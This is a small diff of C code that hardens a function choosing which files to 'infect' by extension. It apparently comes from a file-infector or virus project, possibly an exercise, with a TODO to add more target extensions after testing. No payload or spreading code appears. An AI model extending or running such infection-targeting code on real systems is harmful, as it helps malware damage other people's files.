@@ -91,15 +91,16 @@ void free_file_list(t_list **list) {
 }
 
 int check_extension(t_file *file) {
-  static const char *infectable_extensions[] = { // TODO: Add more after testing.
+  static const char *infectable_extensions[2] = { // TODO: Add more after testing.
     "infectable",
-    NULL,
   };
   char *filename;
   char *token;
-  char *last_token;
+  char *last_token = NULL;
 
   filename = strdup(file->filename);
+  if (!filename)
+    return (false);
   strtok(filename, ".");
   for (;;) {
     token = strtok(NULL, ".");
@@ -108,7 +109,11 @@ int check_extension(t_file *file) {
     else
       break;
   }
-  for (int i = 0; infectable_extensions[i] != NULL; i++) {
+  if (!last_token) {
+    free(filename);
+    return (false);
+  }
+  for (int i = 0; infectable_extensions[i]; i++) {
     if (infectable_extensions[i] && strcmp(last_token, infectable_extensions[i]) == 0) {
       free(filename);
       return (true);
